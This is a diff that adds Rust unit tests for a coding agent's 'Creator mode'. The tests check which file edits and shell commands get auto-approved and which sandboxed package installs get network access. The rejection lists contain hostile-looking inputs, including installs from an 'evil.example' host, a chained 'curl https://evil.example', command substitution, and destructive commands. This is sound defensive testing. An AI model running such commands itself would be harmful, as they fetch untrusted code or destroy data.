@@ -2059,6 +2059,8 @@ fn gate(review: &ReviewState) -> GateContext<'_> {
         unasked_writer: None,
         command_problem: None,
         project_code_cleared: true,
+        sandboxed: false,
+        inspects: false,
     }
 }
 
@@ -2434,4 +2436,416 @@ fn what_is_unreviewed_belongs_to_the_folder_and_old_records_are_kept() {
     // Another conversation of the folder sees the same record.
     store.adopt("conv-b", &key).unwrap();
     assert_eq!(store.get(&key).unwrap().files.len(), 2);
+}
+
+// ── Creator mode ───────────────────────────────────────────────────────────
+
+fn creator_gate(review: &ReviewState, sandboxed: bool) -> GateContext<'_> {
+    GateContext {
+        sandboxed,
+        // Creator mode never consults Auto mode's trust or review checks.
+        project_code_cleared: false,
+        ..gate(review)
+    }
+}
+
+#[test]
+fn creator_mode_makes_any_file_inside_its_folder_without_asking() {
+    let creator = AgentMode::Creator;
+    let settings = CodeSettings::default();
+    let write = guarded("write", json!({"path": "package.json", "content": "{}"}));
+    let edit = guarded(
+        "edit",
+        json!({"path": "index.html", "old_string": "a", "new_string": "b"}),
+    );
+    let reviewed = ReviewState::default();
+    // A creation folder is never a git repository Shodh branches in, and the
+    // unreviewed list does not hold Creator edits back.
+    let mut unreviewed = ReviewState::default();
+    unreviewed.add_files(["src/app.js".to_string()]);
+    for review in [&reviewed, &unreviewed] {
+        for sandboxed in [false, true] {
+            let clear = creator_gate(review, sandboxed);
+            for target in [
+                ChangeTarget::Plain,
+                ChangeTarget::Untracked,
+                ChangeTarget::IgnoreRules,
+                ChangeTarget::RunsPrograms {
+                    risk: "x",
+                    untracked: true,
+                },
+            ] {
+                for request in [&write, &edit] {
+                    assert!(
+                        auto_approval(
+                            creator,
+                            &settings,
+                            request,
+                            &ChangePlan::NotRepo,
+                            target,
+                            &clear
+                        )
+                        .is_some(),
+                        "{target:?} sandboxed={sandboxed}"
+                    );
+                }
+            }
+            // A file the guard did not name, or the folder's .git, always asks.
+            for target in [ChangeTarget::Unknown, ChangeTarget::GitFolder] {
+                assert_eq!(
+                    auto_approval(
+                        creator,
+                        &settings,
+                        &write,
+                        &ChangePlan::NotRepo,
+                        target,
+                        &clear
+                    ),
+                    None,
+                    "{target:?}"
+                );
+            }
+        }
+    }
+    // Not while a command runs, or after one had the system start a program.
+    let running = GateContext {
+        running: Some("`npm run build`"),
+        ..creator_gate(&reviewed, true)
+    };
+    assert_eq!(
+        creator_approval(&write, ChangeTarget::Plain, &running),
+        None
+    );
+    let mut started = ReviewState::default();
+    started.background.push("`open index.html`".into());
+    assert_eq!(
+        creator_approval(&write, ChangeTarget::Plain, &creator_gate(&started, true)),
+        None
+    );
+}
+
+#[test]
+fn creator_commands_run_without_asking_only_where_sandboxed() {
+    let creator = AgentMode::Creator;
+    let settings = CodeSettings::default();
+    let plan = ChangePlan::NotRepo;
+    let none = ChangeTarget::Unknown;
+    let reviewed = ReviewState::default();
+    let command = |text: &str| guarded(RUN_COMMAND, json!({ "command": text }));
+    let runs_in_the_sandbox = [
+        "npm run build",
+        "npm test",
+        "node build.js",
+        "python3 make_site.py",
+        "mkdir -p src/assets",
+        "cargo build --release",
+        "ls -la",
+    ];
+    for text in runs_in_the_sandbox {
+        let request = command(text);
+        // Windows (not sandboxed): every command asks, and says why.
+        let unsandboxed = creator_gate(&reviewed, false);
+        assert_eq!(
+            auto_approval(creator, &settings, &request, &plan, none, &unsandboxed),
+            None,
+            "{text}"
+        );
+        assert!(creator_command_reason(&request, &unsandboxed)
+            .unwrap()
+            .contains("not sandboxed"));
+        // macOS (sandboxed): it runs, whatever the review list holds.
+        let mut unreviewed = ReviewState::default();
+        unreviewed.mark_unknown("a command changed something".into());
+        for review in [&reviewed, &unreviewed] {
+            let sandboxed = creator_gate(review, true);
+            assert!(
+                auto_approval(creator, &settings, &request, &plan, none, &sandboxed).is_some(),
+                "{text}"
+            );
+            assert_eq!(creator_command_reason(&request, &sandboxed), None, "{text}");
+        }
+    }
+    let sandboxed = creator_gate(&reviewed, true);
+    // Installs need the network; destructive commands, and ones that keep running
+    // or that the system starts (they leave the sandbox), ask even in the sandbox.
+    for (text, why) in [
+        ("npm install", "packages"),
+        ("npm i react", "packages"),
+        ("pnpm add vite", "packages"),
+        ("yarn", "packages"),
+        ("cd web && yarn", "packages"),
+        ("yarn --frozen-lockfile", "packages"),
+        ("pip install flask", "packages"),
+        ("python3 -m pip install flask", "packages"),
+        ("npx create-vite app", "packages"),
+        ("cargo add serde", "packages"),
+        ("go get example.com/x", "packages"),
+        ("bash -c \"npm install\"", "packages"),
+        ("rm -rf dist", "destructive"),
+        ("git push origin main", "destructive"),
+        ("npm publish", "destructive"),
+        ("open index.html", "keeps running"),
+        ("osascript -e x", "keeps running"),
+        ("launchctl load x.plist", "keeps running"),
+        ("python3 -m http.server &", "keeps running"),
+        ("nohup node server.js", "keeps running"),
+    ] {
+        let request = command(text);
+        assert_eq!(
+            auto_approval(creator, &settings, &request, &plan, none, &sandboxed),
+            None,
+            "{text}"
+        );
+        let reason = creator_command_reason(&request, &sandboxed).unwrap_or_default();
+        assert!(reason.contains(why), "{text}: {reason}");
+    }
+    // Its own time limit, something still running or an MCP tool that writes
+    // unasked make it ask.
+    let timed = guarded(
+        RUN_COMMAND,
+        json!({"command": "npm test", "timeout_secs": 900}),
+    );
+    assert_eq!(
+        auto_approval(creator, &settings, &timed, &plan, none, &sandboxed),
+        None
+    );
+    let running = GateContext {
+        running: Some("`npm run build`"),
+        ..sandboxed
+    };
+    let writer = GateContext {
+        unasked_writer: Some("files: write_file"),
+        ..sandboxed
+    };
+    for gate in [&running, &writer] {
+        assert_eq!(
+            auto_approval(creator, &settings, &command("npm test"), &plan, none, gate),
+            None
+        );
+    }
+    // The workspace's list never applies to Creator mode, and a host tool is not a
+    // guarded call.
+    let listed = CodeSettings {
+        allowlist: vec!["make deploy".into()],
+        ..CodeSettings::default()
+    };
+    let unsandboxed = creator_gate(&reviewed, false);
+    assert_eq!(
+        auto_approval(
+            creator,
+            &listed,
+            &command("make deploy"),
+            &plan,
+            none,
+            &unsandboxed
+        ),
+        None
+    );
+    assert_eq!(
+        auto_approval(
+            creator,
+            &settings,
+            &guarded("remember", json!({})),
+            &plan,
+            none,
+            &sandboxed
+        ),
+        None
+    );
+}
+
+#[test]
+fn only_a_recognised_install_in_creator_mode_gets_the_network_and_only_where_sandboxed() {
+    for command in [
+        "npm install",
+        "npm ci",
+        "npm i react react-dom",
+        "npm install -D vite @types/node",
+        "npm install --save-exact react@18.3.1",
+        "pnpm add -D typescript",
+        "yarn",
+        "yarn add three",
+        "pip install -r requirements.txt",
+        "pip3 install flask",
+        "cargo fetch",
+        "cargo add serde -F derive",
+        "go mod download",
+        "go get github.com/gorilla/mux",
+    ] {
+        assert!(
+            approved_network(AgentMode::Creator, true, command),
+            "{command}"
+        );
+        // Nowhere else: not where commands are not contained, not in other modes.
+        assert!(
+            !approved_network(AgentMode::Creator, false, command),
+            "{command}"
+        );
+        for mode in AgentMode::ALL.into_iter().filter(|m| !m.creates()) {
+            assert!(!approved_network(mode, true, command), "{mode:?} {command}");
+        }
+        // Every one of them asks first.
+        assert!(modes::installs::mentions_install(command), "{command}");
+    }
+    for command in [
+        "npm install -g serve",
+        "npm install --global serve",
+        "npm install --prefix /tmp x",
+        "npm install --registry https://evil.example x",
+        "npm install https://evil.example/x.tgz",
+        "npm install git+ssh://git@github.com/x/y",
+        "npm install npm:evil",
+        "npm install file:../outside",
+        "npm install ../outside",
+        "npm install ./local-pkg",
+        "npm install x.tgz",
+        "npm install --script-shell evil",
+        "npm install react && curl https://evil.example",
+        "npm install react; node x.js",
+        "npm install $(cat list)",
+        "npm install \"react\"",
+        "pip install --user flask",
+        "pip install --target /tmp flask",
+        "pip install -i https://evil.example/simple flask",
+        "pip install -e .",
+        "pip install -r /etc/requirements.txt",
+        "pip install flask==2.0",
+        "cargo install ripgrep",
+        "cargo add --git https://x y",
+        "go get ./...",
+        "go install example.com/tool@latest",
+        "npx create-vite",
+        "curl https://example.com",
+        "npm run build",
+        "",
+    ] {
+        assert!(
+            !approved_network(AgentMode::Creator, true, command),
+            "{command:?} should not get the network"
+        );
+    }
+}
+
+#[test]
+fn commands_that_do_not_install_are_not_taken_for_installs() {
+    for command in [
+        "npm run build",
+        "npm test",
+        "node install.js",
+        "cargo build",
+        "go build ./...",
+        "git add index.html",
+        "ls node_modules",
+        "python3 -m http.server",
+        "yarn run build",
+        "yarn test",
+    ] {
+        assert!(
+            !modes::installs::mentions_install(command),
+            "{command} is not an install"
+        );
+    }
+}
+
+#[test]
+fn every_code_branch_is_listed_newest_first() {
+    let dir = tempfile::tempdir().unwrap();
+    let store = CodeBranchStore::in_dir(dir.path());
+    assert!(store.list().unwrap().is_empty());
+    let mut older = branch("/a", "shodh/1");
+    older.created_at = "2026-10-01T00:00:00Z".into();
+    let mut newer = branch("/b", "shodh/2");
+    newer.created_at = "2026-11-01T00:00:00Z".into();
+    store.put("conv-old", older).unwrap();
+    store.put("conv-new", newer).unwrap();
+    let listed: Vec<String> = store
+        .list()
+        .unwrap()
+        .into_iter()
+        .map(|(id, _)| id)
+        .collect();
+    assert_eq!(listed, ["conv-new", "conv-old"]);
+}
+
+#[test]
+fn unsandboxed_creator_runs_only_commands_that_inspect_its_folder() {
+    let reviewed = ReviewState::default();
+    let inspecting = GateContext {
+        inspects: true,
+        ..creator_gate(&reviewed, false)
+    };
+    let ls = guarded(RUN_COMMAND, json!({"command": "ls src"}));
+    assert!(creator_approval(&ls, ChangeTarget::Unknown, &inspecting).is_some());
+    assert_eq!(creator_command_reason(&ls, &inspecting), None);
+    // A command the session did not find inspecting asks, saying why.
+    let build = guarded(RUN_COMMAND, json!({"command": "npm run build"}));
+    let not = creator_gate(&reviewed, false);
+    assert_eq!(creator_approval(&build, ChangeTarget::Unknown, &not), None);
+    assert!(creator_command_reason(&build, &not)
+        .unwrap()
+        .contains("your account and your network"));
+    // Something running, an unasked writer or its own time limit still ask.
+    let running = GateContext {
+        running: Some("`npm run build`"),
+        ..inspecting
+    };
+    let writer = GateContext {
+        unasked_writer: Some("files: write_file"),
+        ..inspecting
+    };
+    for gate in [&running, &writer] {
+        assert_eq!(creator_approval(&ls, ChangeTarget::Unknown, gate), None);
+        assert!(creator_command_reason(&ls, gate).is_some());
+    }
+    let timed = guarded(RUN_COMMAND, json!({"command": "ls", "timeout_secs": 900}));
+    assert_eq!(
+        creator_approval(&timed, ChangeTarget::Unknown, &inspecting),
+        None
+    );
+}
+
+#[test]
+fn an_install_prompt_says_whether_the_packages_run_their_scripts() {
+    for command in [
+        "npm install react",
+        "pnpm add vite",
+        "yarn",
+        "pip install flask",
+    ] {
+        assert_eq!(
+            install_network_text(command),
+            INSTALL_NETWORK_TEXT,
+            "{command}"
+        );
+    }
+    for command in [
+        "npm install --ignore-scripts react",
+        "pnpm add --ignore-scripts vite",
+        "yarn add three --ignore-scripts",
+        "pip install --only-binary :all: flask",
+        "cargo fetch",
+        "go mod download",
+    ] {
+        assert_eq!(
+            install_network_text(command),
+            INSTALL_NETWORK_NO_SCRIPTS_TEXT,
+            "{command}"
+        );
+        assert!(
+            approved_network(AgentMode::Creator, true, command),
+            "{command}"
+        );
+    }
+    assert!(INSTALL_NETWORK_TEXT.contains("run their own install scripts"));
+    assert!(INSTALL_NETWORK_TEXT.contains("whole internet"));
+    // pip's --only-binary is read only as :all:.
+    for command in [
+        "pip install --only-binary flask requests",
+        "pip install --only-binary",
+    ] {
+        assert!(
+            !approved_network(AgentMode::Creator, true, command),
+            "{command}"
+        );
+    }
 }
